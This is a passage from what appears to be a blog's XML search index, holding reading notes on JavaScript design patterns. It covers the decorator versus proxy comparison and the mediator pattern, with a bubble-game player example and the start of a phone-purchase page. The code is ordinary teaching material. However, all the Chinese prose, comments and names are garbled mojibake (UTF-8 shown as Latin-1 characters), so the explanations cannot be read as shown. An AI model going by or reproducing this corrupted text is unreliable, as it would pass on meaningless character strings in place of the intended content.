·ä¸ºå¯¹è±¡æä¾›ä¸€å®šç¨‹åº¦ä¸Šçš„å¼•ç”¨ï¼Œå®ƒä»¬çš„å®žçŽ°éƒ¨åˆ†éƒ½ä¿ç•™äº†å¯¹å¦å¤–ä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ï¼Œå¹¶ä¸”å‘é‚£ä¸ªå¯¹è±¡å‘é€è¯·æ±‚ã€‚ ä»£ç†æ¨¡å¼å’Œè£…é¥°è€…æ¨¡å¼æœ€é‡è¦çš„åŒºåˆ«åœ¨äºŽå®ƒä»¬çš„æ„å›¾å’Œè®¾è®¡ç›®çš„ã€‚ä»£ç†æ¨¡å¼çš„ç›®çš„æ˜¯ï¼Œå½“ç›´æŽ¥è®¿é—®æœ¬ä½“ä¸æ–¹ä¾¿æˆ–è€…ä¸ç¬¦åˆéœ€æ±‚çš„æ—¶å€™ï¼Œä¸ºè¿™ä¸ªæœ¬ä½“æä¾›ä¸€ä¸ªæ›¿ä»£è€…ã€‚æœ¬ä½“å®šä¹‰äº†å…³é”®åŠŸèƒ½ï¼Œ è€Œä»£ç†æä¾›æˆ–æ‹’ç»å¯¹å®ƒçš„è®¿é—®ï¼Œæˆ–è€…åœ¨è®¿é—®æœ¬ä½“ä¹‹å‰åšä¸€äº›é¢å¤–çš„äº‹æƒ…ã€‚è£…é¥°è€…æ¨¡å¼çš„ä½œç”¨å°±ä¸ºå¯¹è±¡åŠ¨æ€åŠ å…¥è¡Œä¸ºã€‚æ¢å¥è¯è¯´ï¼Œä»£ç†æ¨¡å¼å¼ºè°ƒçš„æ˜¯ä¸€ç§å…³ç³» ï¼ˆProxyï¼‰ ä¸Žå®ƒå®žä½“çš„å…³ç³»ï¼Œè¿™ç§å…³ç³»å¯ä»¥é™æ€çš„è¡¨è¾¾ï¼Œä¹Ÿå°±è¯´ï¼Œè¿™ç§å…³ç³»æ˜¯ä¸€å¼€å§‹å°±å¯ä»¥è¢«ç¡®å®šçš„ã€‚è€Œè£…é¥°è€…æ¨¡å¼ç”¨äºŽä¸€å¼€å§‹ä¸èƒ½ç¡®å®šå¯¹è±¡çš„å…¨éƒ¨åŠŸèƒ½æ—¶ã€‚ä»£ç†æ¨¡å¼é€šå¸¸åªæœ‰ä¸€å±‚ä»£ç†-æœ¬ä½“çš„å¼•ç”¨ï¼Œè€Œè£…é¥°è€…æ¨¡å¼ç»å¸¸ä¼šå½¢æˆä¸€æ¡é•¿é•¿çš„è£…é¥°é“¾ã€‚ åœ¨è™šæ‹Ÿä»£ç†å®žçŽ°å›¾ç‰‡é¢„åŠ è½½çš„ä¾‹å­ä¸­ï¼Œæœ¬ä½“è´Ÿè´£è®¾ç½® img èŠ‚ç‚¹çš„ srcï¼Œä»£ç†åˆ™æä¾›äº†é¢„åŠ è½½çš„åŠŸèƒ½ï¼Œè¿™çœ‹èµ·æ¥ä¹Ÿæ˜¯â€œåŠ å…¥è¡Œä¸ºâ€çš„ä¸€ç§æ–¹å¼ï¼Œä½†è¿™ç§åŠ å…¥è¡Œä¸ºçš„æ–¹å¼å’Œè£…é¥°è€…æ¨¡å¼çš„åé‡ç‚¹æ˜¯ä¸ä¸€æ ·çš„ã€‚è£…é¥°è€…æ¨¡å¼æ˜¯å®žå®žåœ¨åœ¨çš„ä¸ºå¯¹è±¡å¢žåŠ æ–°çš„èŒè´£å’Œè¡Œä¸ºï¼Œè€Œä»£ç†åšçš„äº‹æƒ…è¿˜æ˜¯è·Ÿæœ¬ä½“ä¸€æ ·ï¼Œæœ€ç»ˆéƒ½æ˜¯è®¾ç½® srcã€‚ä½†ä»£ç†å¯ä»¥åŠ å…¥ä¸€äº›â€œèªæ˜Žâ€çš„åŠŸèƒ½ï¼Œæ¯”å¦‚åœ¨å›¾ç‰‡çœŸæ­£åŠ è½½å¥½ä¹‹å‰ï¼Œå…ˆä½¿ç”¨ä¸€å¼ å ä½çš„ loading å›¾ç‰‡åé¦ˆç»™å®¢æˆ·ã€‚ å°ç»“æœ¬ç« é€šè¿‡æ•°æ®ä¸ŠæŠ¥ã€ç»Ÿè®¡å‡½æ•°çš„æ‰§è¡Œæ—¶é—´ã€åŠ¨æ€æ”¹å˜å‡½æ•°å‚æ•°ä»¥åŠæ’ä»¶å¼çš„è¡¨å•éªŒè¯çš„è¿™ 4 ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬äº†è§£åˆ°äº†è£…é¥°å‡½æ•°ï¼Œå®ƒæ˜¯ JavaScript ä¸­ç‹¬ç‰¹çš„è£…é¥°è€…æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼çš„åœ¨å®žé™…å¼€å‘ä¸­éžå¸¸æœ‰ç”¨ï¼Œé™¤äº†ä¸Šé¢æåˆ°çš„ä¾‹å­ï¼Œåœ¨æ¡†æž¶å¼€å‘ä¸­ä¹Ÿéžå¸¸æœ‰ç”¨ã€‚æˆ‘ä»¬å¸Œæœ›æ¡†æž¶é‡Œé¢çš„å‡½æ•°æä¾›çš„æ˜¯ä¸€äº›ç¨³å®šè€Œä¸”å¯ä»¥ç§»æ¤çš„åŠŸèƒ½ï¼Œé‚£äº›ä¸ªæ€§åŒ–çš„åŠŸèƒ½åœ¨æ¡†æž¶ä¹‹å¤–çš„åŠ¨æ€è£…é¥°ä¸ŠåŽ»ï¼Œè¿™å¯ä»¥é¿å…ä¸ºäº†è®©æ¡†æž¶æœ‰æ›´å¤šçš„åŠŸèƒ½ï¼Œè€ŒåŽ»ä½¿ç”¨ä¸€äº› if-else è¯­å¥é¢„æµ‹ç”¨æˆ·çš„å®žé™…éœ€è¦ã€‚]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡æ¨¡å¼â€”â€”ä¸­ä»‹è€…æ¨¡å¼]]></title>
    <url>%2F2019-03-13-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E4%B8%AD%E4%BB%8B%E8%80%85%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ JavaScriptè®¾è®¡æ¨¡å¼â€”â€”ä¸­ä»‹è€…æ¨¡å¼ä¸­ä»‹è€…æ¨¡å¼çš„ä½œç”¨å°±æ˜¯æŽ¥è§¦å¯¹è±¡ä¸Žå¯¹è±¡ä¹‹é—´çš„ç´§è€¦åˆå…³ç³»ã€‚å¢žåŠ ä¸€ä¸ªä¸­ä»‹è€…å¯¹è±¡åŽï¼Œæ‰€æœ‰çš„ç›¸å…³å¯¹è±¡éƒ½é€šè¿‡ä¸­ä»‹è€…å¯¹è±¡æ¥é€šä¿¡ï¼Œè€Œä¸æ˜¯äº’ç›¸å¼•ç”¨ï¼Œæ‰€ä»¥å½“ä¸€ä¸ªå¯¹è±¡å‘ç”Ÿå˜åŒ–æ—¶ï¼Œåªéœ€è¦é€šçŸ¥ä¸­ä»‹è€…å¯¹è±¡å°±å¯ä»¥äº†ã€‚ä¸­ä»‹è€…ä½¿å„å¯¹è±¡ä¹‹é—´è€¦åˆæ¾æ•£ï¼Œè€Œä¸”å¯ä»¥ç‹¬ç«‹åœ°æ”¹å˜å®ƒä»¬ä¹‹é—´çš„äº¤äº’ã€‚ä¸­ä»‹è€…æ¨¡å¼ä½¿å¾—ç½‘çŠ¶çš„å¤šå¯¹å¤šå…³ç³»å˜æˆäº†ç®€å•çš„ä¸€å¯¹å¤šçš„å…³ç³»ã€‚ çŽ°å®žä¸­çš„ä¸­ä»‹è€…1.æœºåœºæŒ‡æŒ¥å¡” ä¸­ä»‹è€…ä¹Ÿè¢«ç§°ä¸ºè°ƒåœè€…ï¼Œæˆ‘ä»¬æƒ³è±¡ä¸€ä¸‹æœºåœºçš„æŒ‡æŒ¥å¡”ï¼Œå¦‚æžœæ²¡æœ‰æŒ‡æŒ¥å¡”çš„å­˜åœ¨ï¼Œæ¯ä¸€æž¶é£žæœºè¦å’Œæ–¹åœ† 100 å…¬é‡Œå†…çš„æ‰€æœ‰é£žæœºé€šä¿¡ï¼Œæ‰èƒ½ç¡®å®šèˆªçº¿ä»¥åŠé£žè¡ŒçŠ¶å†µï¼ŒåŽæžœæ˜¯ä¸å¯æƒ³è±¡çš„ã€‚çŽ°å®žä¸­çš„æƒ…å†µæ˜¯ï¼Œæ¯æž¶é£žæœºéƒ½åªéœ€è¦å’ŒæŒ‡æŒ¥å¡”é€šä¿¡ã€‚æŒ‡æŒ¥å¡”ä½œä¸ºè°ƒåœè€…ï¼ŒçŸ¥é“æ¯ä¸€æž¶é£žæœºçš„é£žè¡ŒçŠ¶å†µï¼Œæ‰€ä»¥å®ƒå¯ä»¥å®‰æŽ’æ‰€æœ‰é£žæœºçš„èµ·é™æ—¶é—´ï¼ŒåŠæ—¶åšå‡ºèˆªçº¿è°ƒæ•´ã€‚ 2.åšå½©å…¬å¸ æ‰“éº»å°†çš„äººç»å¸¸é‡åˆ°è¿™æ ·çš„é—®é¢˜ï¼Œæ‰“äº†å‡ å±€ä¹‹åŽå¼€å§‹è®¡ç®—é’±ï¼ŒA è‡ªæ‘¸äº†ä¸¤æŠŠï¼ŒB æ äº†ä¸‰æ¬¡ï¼ŒC ç‚¹ç‚®ä¸€æ¬¡ç»™ Dï¼Œè°åº”è¯¥ç»™è°å¤šå°‘é’±å·²ç»å¾ˆéš¾è®¡ç®—æ¸…æ¥šï¼Œè€Œè¿™è¿˜æ˜¯åœ¨åªæœ‰ 4 ä¸ªäººå‚ä¸Žçš„æƒ…å†µä¸‹ã€‚åœ¨ä¸–ç•Œæ¯æœŸé—´è´­ä¹°è¶³çƒå½©ç¥¨ï¼Œå¦‚æžœæ²¡æœ‰åšå½©å…¬å¸ä½œä¸ºä¸­ä»‹ï¼Œä¸Šåƒä¸‡çš„äººä¸€èµ·è®¡ç®—èµ”çŽ‡å’Œè¾“èµ¢ç»å¯¹æ˜¯ä¸å¯èƒ½å®žçŽ°çš„äº‹æƒ…ã€‚æœ‰äº†åšå½©å…¬å¸ä½œä¸ºä¸­ä»‹ï¼Œæ¯ä¸ªäººåªéœ€å’Œåšå½©å…¬å¸å‘ç”Ÿå…³è”ï¼Œåšå½©å…¬å¸ä¼šæ ¹æ®æ‰€æœ‰äººçš„æŠ•æ³¨æƒ…å†µè®¡ç®—å¥½èµ”çŽ‡ï¼Œå½©æ°‘ä»¬èµ¢äº†é’±å°±ä»Žåšå½©å…¬å¸æ‹¿ï¼Œè¾“äº†é’±å°±äº¤ç»™åšå½©å…¬å¸ã€‚ ä¾‹å­â€”â€”æ³¡æ³¡å ‚æ¸¸æˆå…ˆå®šä¹‰ä¸€ä¸ªçŽ©å®¶æž„é€ å‡½æ•°ï¼Œå®ƒæœ‰ä¸‰ä¸ªç®€å•çš„åŽŸåž‹æ–¹æ³•ï¼šPlay.prototype.winã€Play.prototype.lose ä»¥åŠè¡¨ç¤ºçŽ©å®¶æ­»äº¡çš„ Play.prototype.die å› ä¸ºçŽ©å®¶çš„æ•°é‡æ˜¯2ï¼Œæ‰€æœ‰å½“å…¶ä¸­ä¸€ä¸ªçŽ©å®¶æ­»äº¡çš„æ—¶å€™æ¸¸æˆä¾¿ç»“æŸï¼ŒåŒæ—¶é€šçŸ¥å®ƒçš„å¯¹æ‰‹èƒœåˆ©ã€‚ 12345678910111213141516171819202122function Player(name)&#123; this.name = name; this.enemy = null; &#125;Player.prototype.win = function()&#123; console.log(this.name + ' won');&#125;Player.prototype.lose = function()&#123; console.log(this.name + ' lost');&#125;Player.prototype.die = function()&#123; this.lose(); this.enemy.win();&#125;// åˆ›å»ºä¸¤ä¸ªçŽ©å®¶å¯¹è±¡ï¼šconst player1 = new Player('çš®è›‹');const player2 = new Player('å°ä¹–');// ç»™çŽ©å®¶äº’ç›¸è®¾ç½®æ•Œäººï¼šplayer1.enemy = player2;player2.enemy = player1;// å½“çŽ©å®¶ player1 è¢«æ³¡æ³¡ç‚¸æ­»çš„æ—¶å€™ï¼Œåªéœ€è¦è°ƒç”¨è¿™ä¸€å¥ä»£ç ä¾¿å®Œæˆäº†ä¸€å±€æ¸¸æˆï¼šplayer1.die(); ä¸ºæ¸¸æˆå¢žåŠ é˜Ÿä¼å› ä¸ºçŽ©å®¶æ•°é‡å˜å¤šï¼Œç”¨ä¸‹é¢çš„æ–¹å¼æ¥è®¾ç½®é˜Ÿå‹å’Œæ•Œäººæ— ç–‘å¾ˆä½Žæ•ˆ 1234player1.partners= [player1,player2,player3,player4]; player1.enemies = [player5,player6,player7,player8]; Player5.partners= [player5,player6,player7,player8]; Player5.enemies = [player1,player2,player3,player4]; æ‰€ä»¥æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæ•°ç»„ players æ¥ä¿å­˜æ‰€æœ‰çš„çŽ©å®¶ï¼Œåœ¨åˆ›å»ºçŽ©å®¶ä¹‹åŽï¼Œå¾ªçŽ¯ players æ¥ç»™æ¯ä¸ªçŽ©å®¶è®¾ç½®é˜Ÿå‹å’Œæ•Œäººï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374const players = [];// æ”¹å†™æž„é€ å‡½æ•°ï¼Œä½¿å¾—æ¯ä¸ªçŽ©å®¶éƒ½å¢žåŠ ä¸€äº›å±žæ€§ï¼Œåˆ†åˆ«æ˜¯é˜Ÿå‹åˆ—è¡¨ï¼Œæ•Œäººåˆ—è¡¨ï¼ŒçŽ©å®¶å½“å‰çŠ¶æ€ï¼Œè§’è‰²åå­—å·²ç»çŽ©å®¶æ‰€åœ¨é˜Ÿä¼çš„é¢œè‰²function Player(name,teamColor)&#123; this.partners = []; this.enemies = []; this.state = 'live'; this.name = name; this.teamColor = teamColor;&#125;Player.prototype.win = function()&#123; console.log('winner: '+this.name);&#125;Player.prototype.lose = function()&#123; console.log('loser: '+this.name);&#125;Player.prototype.die = function()&#123; let all_dead = true; this.state = 'dead'; for(let i=0,partner;partner = this.partners[i++];)&#123; // éåŽ†é˜Ÿå‹åˆ—è¡¨ if(partner.state !== 'dead')&#123; // å¦‚æžœè¿˜æœ‰ä¸€ä¸ªé˜Ÿå‹æ²¡æœ‰æ­»äº¡ï¼Œåˆ™æ¸¸æˆè¿˜æ²¡æœ‰å¤±è´¥ all_dead = false; break; &#125; &#125; if(all_dead === true)&#123; // å¦‚æžœé˜Ÿå‹å…¨éƒ¨æ­»äº¡ this.lose(); for(let i=0,partner;partner = this.partners[i++];)&#123; // é€šçŸ¥æ‰€æœ‰é˜Ÿå‹çŽ©å®¶æ¸¸æˆå¤±è´¥ partner.lose(); &#125; for(let i=0,enemy;enemy = this.enemies[i++];)&#123; // é€šçŸ¥æ‰€æœ‰æ•Œäººæ¸¸æˆèƒœåˆ© enemy.win(); &#125; &#125;&#125;// å®šä¸€ä¸ªå·¥åŽ‚æ¥åˆ›å»ºçŽ©å®¶ï¼šconst playerFactory = function(name,teamColor)&#123; const newPlayer = new Player(name,teamColor); // åˆ›å»ºæ–°çŽ©å®¶ for(let i=0,player;player = players[i++];)&#123; // é€šçŸ¥æ‰€æœ‰çŽ©å®¶ï¼Œæœ‰æ–°è§’è‰²åŠ å…¥ if(player.teamColor === newPlayer.teamColor)&#123; // å¦‚æžœæ˜¯åŒä¸€é˜Ÿçš„çŽ©å®¶ player.partners.push(newPlayer); // äº’ç›¸æ·»åŠ åˆ°é˜Ÿå‹åˆ—è¡¨ newPlayer.partners.push(player) &#125;else&#123; player.enemies.push(newPlayer); // äº’ç›¸æ·»åŠ åˆ°æ•Œäººåˆ—è¡¨ newPlayer.enemies.push(player); &#125; &#125; players.push(newPlayer); return newPlayer;&#125;const player1 = playerFactory( 'çš®è›‹', 'red' ), player2 = playerFactory( 'å°ä¹–', 'red' ), player3 = playerFactory( 'å®å®', 'red' ), player4 = playerFactory( 'å°å¼º', 'red' ), player5 = playerFactory( 'é»‘å¦ž', 'blue' ),player6 = playerFactory( 'è‘±å¤´', 'blue' ),player7 = playerFactory( 'èƒ–å¢©', 'blue' ), player8 = playerFactory( 'æµ·ç›—', 'blue' );player1.die();player2.die();player3.die();player4.die();// loser: å°å¼º// loser: çš®è›‹// loser: å°ä¹–// loser: å®å®// winner: é»‘å¦ž// winner: è‘±å¤´// winner: èƒ–å¢©// winner: æµ·ç›— çŽ©å®¶å¢žå¤šå¸¦æ¥çš„å›°æ‰°çŽ°åœ¨æˆ‘ä»¬å·²ç»å¯ä»¥éšæ„åœ°ä¸ºæ¸¸æˆå¢žåŠ çŽ©å®¶æˆ–è€…é˜Ÿä¼ï¼Œä½†é—®é¢˜æ˜¯ï¼Œæ¯ä¸ªçŽ©å®¶å’Œå…¶ä»–çŽ©å®¶éƒ½æ˜¯ç´§ç´§è€¦åˆåœ¨ä¸€èµ·çš„ã€‚åœ¨æ­¤æ®µä»£ç ä¸­ï¼Œæ¯ä¸ªçŽ©å®¶å¯¹è±¡éƒ½æœ‰ä¸¤ä¸ªå±žæ€§ï¼Œthis.partners å’Œ this.enemiesï¼Œç”¨æ¥ä¿å­˜å…¶ä»–çŽ©å®¶å¯¹è±¡çš„å¼•ç”¨ã€‚å½“æ¯ä¸ªå¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿæ”¹å˜ï¼Œæ¯”å¦‚è§’è‰²ç§»åŠ¨ã€åƒåˆ°é“å…·æˆ–è€…æ­»äº¡æ—¶ï¼Œéƒ½å¿…é¡»è¦æ˜¾å¼åœ°éåŽ†é€šçŸ¥å…¶ä»–å¯¹è±¡ã€‚ åœ¨è¿™ä¸ªä¾‹å­ä¸­åªåˆ›å»ºäº† 8 ä¸ªçŽ©å®¶ï¼Œæˆ–è®¸è¿˜æ²¡æœ‰å¯¹ä½ äº§ç”Ÿè¶³å¤Ÿå¤šçš„å›°æ‰°ï¼Œè€Œå¦‚æžœåœ¨ä¸€ä¸ªå¤§åž‹ç½‘ç»œæ¸¸æˆä¸­ï¼Œç”»é¢é‡Œæœ‰æˆç™¾ä¸Šåƒä¸ªçŽ©å®¶ï¼Œå‡ åæ”¯é˜Ÿä¼åœ¨äº’ç›¸åŽ®æ€ã€‚å¦‚æžœæœ‰ä¸€ä¸ªçŽ©å®¶æŽ‰çº¿ï¼Œå¿…é¡»ä»Žæ‰€æœ‰å…¶ä»–çŽ©å®¶çš„é˜Ÿå‹åˆ—è¡¨å’Œæ•Œäººåˆ—è¡¨ä¸­éƒ½ç§»é™¤è¿™ä¸ªçŽ©å®¶ã€‚æ¸¸æˆä¹Ÿè®¸è¿˜æœ‰è§£é™¤é˜Ÿä¼å’Œæ·»åŠ åˆ°åˆ«çš„é˜Ÿä¼çš„åŠŸèƒ½ï¼Œçº¢è‰²çŽ©å®¶å¯ä»¥çªç„¶å˜æˆè“è‰²çŽ©å®¶ï¼Œè¿™å°±ä¸å†ä»…ä»…æ˜¯å¾ªçŽ¯èƒ½å¤Ÿè§£å†³çš„é—®é¢˜äº†ã€‚é¢å¯¹è¿™æ ·çš„éœ€æ±‚ï¼Œæˆ‘ä»¬ä¸Šé¢çš„ä»£ç å¯ä»¥è¿…é€Ÿè¿›å…¥æŠ•é™æ¨¡å¼ ç”¨ä¸­ä»‹è€…æ¨¡å¼æ”¹é€ é¦–å…ˆä¾ç„¶æ˜¯å®šä¹‰ Player æž„é€ å‡½æ•°å’Œ player å¯¹è±¡çš„åŽŸåž‹æ–¹æ³•å™¶ï¼Œåœ¨ player å¯¹è±¡çš„è¿™äº›åŽŸåž‹æ–¹æ³•ä¸­ï¼Œä¸å†è´Ÿè´£å…·ä½“çš„æ‰§è¡Œé€»è¾‘ï¼Œè€Œæ˜¯æŠŠæ“ä½œè½¬äº¤ç»™ä¸­ä»‹è€…å¯¹è±¡ï¼Œæˆ‘ä»¬æŠŠä¸­ä»‹è€…å¯¹è±¡å‘½åä¸º playerDirector: 123456789101112131415161718192021222324252627function Player(name,teamColor)&#123; this.name = name; this.teamColor = teamColor; this.state = 'live';&#125;Player.prototype.win = function()&#123; console.log('winner: '+this.name);&#125;Player.prototype.lose = function()&#123; console.log('loser: '+this.name);&#125; Player.prototype.die = function()&#123; this.state = 'dead'; playerDirector.reciveMessage('playerDead',this); // ç»™ä¸­ä»‹è€…å‘é€æ¶ˆæ¯ï¼ŒçŽ©å®¶æ­»äº¡&#125;Player.prototype.remove = function()&#123; playerDirector.reciveMessage('removePlayer',this); // ç»™ä¸­ä»‹è€…å‘é€æ¶ˆæ¯ï¼Œç§»é™¤ä¸€ä¸ªçŽ©å®¶&#125;Player.prototype.changeTeam = function(color)&#123; playerDirector.reciveMessage('changeTeam',this,color); // ç»™ä¸­ä»‹è€…å‘é€æ¶ˆæ¯ï¼ŒçŽ©å®¶æ¢é˜Ÿ&#125;const playerFactory = function(name,teamColor)&#123; const newPlayer = new Player(name,teamColor); playerDirector.reciveMessage('addPlayer',newPlayer); // ç»™ä¸­ä»‹è€…å‘é€æ¶ˆæ¯ï¼Œæ–°å¢žçŽ©å®¶ return newPlayer;&#125; æœ€åŽï¼Œéœ€è¦å®žçŽ°è¿™ä¸ªä¸­ä»‹è€… PlayerDirector å¯¹è±¡ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼ã€‚ åˆ©ç”¨å‘å¸ƒ-è®¢é˜…æ¨¡å¼ã€‚å°† playerDirector å®žçŽ°ä¸ºè®¢é˜…è€…ï¼Œå„ player ä½œä¸ºå‘å¸ƒè€…ï¼Œä¸€æ—¦ player çš„çŠ¶æ€å‘ç”Ÿæ”¹å˜ï¼Œä¾¿æŽ¨é€ä¿¡æ¯ç»™ playerDirector ï¼ŒplayerDirector å¤„ç†æ¶ˆæ¯åŽå°†åé¦ˆå‘é€ç»™å…¶ä»– player åœ¨ playerDirector ä¸­å¼€å‘ä¸€äº›æŽ¥å—æ¶ˆæ¯çš„æŽ¥å£ï¼Œå„ player å¯ä»¥ç›´æŽ¥è°ƒç”¨è¯¥æŽ¥å£æ¥ç»™ playerDirector å‘é€æ¶ˆæ¯ï¼Œplayer åªéœ€ä¼ é€’ä¸€ä¸ªå‚æ•°ç»™ playerDirector ï¼Œè¿™ä¸ªå‚æ•°çš„ç›®çš„æ˜¯ä½¿å¾— playerDirector å¯ä»¥è¯†åˆ«å‘é€è€…ã€‚åŒæ ·ï¼ŒplayerDirector æŽ¥å—æ¶ˆæ¯ä¹‹åŽä¼šå°†å¤„ç†ç»“æžœåé¦ˆç»™å…¶ä»– playerã€‚ è¿™ä¸¤ç§æ–¹å¼çš„å®žçŽ°æœ¬è´¨ä¸Šæ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚åœ¨è¿™é‡Œä½¿ç”¨ç¬¬äºŒç§æ–¹å¼ï¼ŒplayerDirector å¼€å‘ä¸€ä¸ªå¯¹å¤–æš´éœ²çš„æŽ¥å£ recievMessage,è´Ÿè´£æŽ¥æ”¶ player å¯¹è±¡å‘é€çš„æ¶ˆæ¯ï¼Œè€Œ player å¯¹è±¡å‘é€æ¶ˆæ¯çš„æ—¶å€™ï¼Œæ€»æ˜¯æŠŠè‡ªèº«çš„ this ä½œä¸ºå‚æ•°å‘é€ç»™ playerDirector ï¼Œä»¥ä¾¿å…¶è¯†åˆ«æ¶ˆæ¯æ¥è‡ªäºŽå“ªä¸ªçŽ©å®¶çš„å¯¹è±¡ï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475const playerDirector = (function()&#123; const players = &#123;&#125;, // ä¿å­˜æ‰€æœ‰çŽ©å®¶ operations = &#123;&#125;; // ä¸­ä»‹è€…å¯ä»¥æ‰§è¡Œçš„æ“ä½œ operations.addPlayer = function(player)&#123; // å¢žåŠ çŽ©å®¶ const teamColor = player.teamColor; players[teamColor] = players[teamColor] || []; // å¦‚æžœè¯¥é¢œè‰²çš„çŽ©å®¶è¿˜æ²¡æœ‰æˆç«‹é˜Ÿä¼ï¼Œåˆ™æ–°æˆç«‹ä¸€ä¸ªé˜Ÿä¼ players[teamColor].push(player); &#125;; operations.removePlayer = function(player)&#123; // ç§»é™¤çŽ©å®¶ const teamColor = player.teamColor, teamPlayers = players[teamColor] || []; for(let i=teamPlayers.length - 1;i&gt;=0;i--)&#123; if(teamPlayers[i] === player)&#123; teamPlayers.splice(i,1); &#125; &#125; &#125;; operations.changeTeam = function(player,newTeamCOlor)&#123; // çŽ©å®¶æ¢é˜Ÿ operations.removePlayer(player); player.teamColor = newTeamCOlor; operations.addPlayer(player); &#125;; operations.playerDead = function(player)&#123; // çŽ©å®¶æ­»äº¡ const teamColor = player.teamColor, teamPlayers = players[teamColor]; let all_dead = true; for(let i=0,player;player = teamPlayers[i++];)&#123; if(player.state !== 'dead')&#123; all_dead = false; break; &#125; &#125; if(all_dead)&#123; for(let i=0,player;player = teamPlayers[i++];)&#123; player.lose(); &#125; for(let color in players)&#123; if(color !== teamColor)&#123; const teamPlayers = players[color]; //å…¶ä»–é˜Ÿä¼çš„çŽ©å®¶ for(let i=0,player;player = teamPlayers[i++];)&#123; player.win(); &#125; &#125; &#125; &#125; &#125;; const reciveMessage = function()&#123; const message = Array.prototype.shift.call(arguments); operations[message].apply(this,arguments); &#125;; return &#123; reciveMessage &#125;&#125;)();// æµ‹è¯•const player1 = playerFactory( 'çš®è›‹', 'red' ), player2 = playerFactory( 'å°ä¹–', 'red' ), player3 = playerFactory( 'å®å®', 'red' ), player4 = playerFactory( 'å°å¼º', 'red' ), player5 = playerFactory( 'é»‘å¦ž', 'blue' ),player6 = playerFactory( 'è‘±å¤´', 'blue' ),player7 = playerFactory( 'èƒ–å¢©', 'blue' ), player8 = playerFactory( 'æµ·ç›—', 'blue' );player1.changeTeam( 'blue' ); // æ¢é˜Ÿplayer1.die();player2.die();player3.die();player4.die(); ä¾‹å­â€”â€”è´­ä¹°å•†å“å‡è®¾æˆ‘ä»¬æ­£åœ¨ç¼–å†™ä¸€ä¸ªæ‰‹æœºè´­ä¹°çš„é¡µé¢ï¼Œåœ¨è´­ä¹°æµç¨‹ä¸­ï¼Œå¯ä»¥é€‰æ‹©æ‰‹æœºçš„é¢œè‰²ä»¥åŠè¾“å…¥è´­ä¹°æ•°é‡ï¼ŒåŒæ—¶é¡µé¢ä¸­æœ‰ä¸¤ä¸ªå±•ç¤ºåŒºåŸŸï¼Œåˆ†åˆ«å‘ç”¨æˆ·å±•ç¤ºåˆšåˆšé€‰æ‹©å¥½çš„é¢œè‰²å’Œæ•°é‡ã€‚è¿˜æœ‰ä¸€ä¸ªæŒ‰é’®åŠ¨æ€æ˜¾ç¤ºä¸‹ä¸€æ­¥çš„æ“ä½œï¼Œæˆ‘ä»¬éœ€è¦æŸ¥è¯¢è¯¥é¢œè‰²æ‰‹æœºå¯¹åº”çš„åº“å­˜ï¼Œå¦‚æžœåº“å­˜æ•°é‡å°‘äºŽè¿™æ¬¡çš„è´­ä¹°æ•°é‡ï¼ŒæŒ‰é’®å°†è¢«ç¦ç”¨å¹¶ä¸”æ˜¾ç¤ºåº“å­˜ä¸è¶³ï¼Œåä¹‹æŒ‰é’®å¯ä»¥ç‚¹å‡»å¹¶ä¸”æ˜¾ç¤ºæ”¾å…¥è´­ç‰©è½¦ã€‚ è¿™ä¸ªéœ€æ±‚æ˜¯éžå¸¸å®¹æ˜“å®žçŽ°çš„ï¼Œå‡è®¾æˆ‘ä»¬å·²ç»ä»ŽåŽå°èŽ·å–äº†æ‰€æœ‰é¢œè‰²æ‰‹æœºçš„åº“å­˜é‡ï¼š 1234var goods = &#123; // æ‰‹æœºåº“å­˜ 'red':3, 'blue':6&#125; é¡µé¢å¸ƒå±€éœ€è¦ï¼š ä¸‹æ‹‰é€‰æ‹©æ¡† colorSelect æ–‡æœ¬è¾“å…¥æ¡† numberInput å±•ç¤ºé¢œè‰²ä¿¡æ¯ colorInfo å±•ç¤ºè´­ä¹°æ•°é‡ä¿¡æ¯ numberInfo å†³å®šä¸‹ä¸€æ­¥æ“ä½œçš„æŒ‰é’® nextBtn ç¼–å†™ä»£ç HTMLä»£ç ï¼š 123456789é€‰æ‹©é¢œè‰²ï¼š&lt;select id="colorSelect"&gt; &lt;option value=""&gt;è¯·é€‰æ‹©&lt;/option&gt; &lt;option value="red"&gt;çº¢è‰²&lt;/option&gt; &lt;option value="blue"&gt;è“è‰²&lt;/option&gt;&lt;/select&gt;è¾“å…¥è´­ä¹°æ•°é‡ï¼š&lt;input type="text" id="numberInput"&gt;æ‚¨é€‰æ‹©äº†é¢œè‰²ï¼š&lt;div 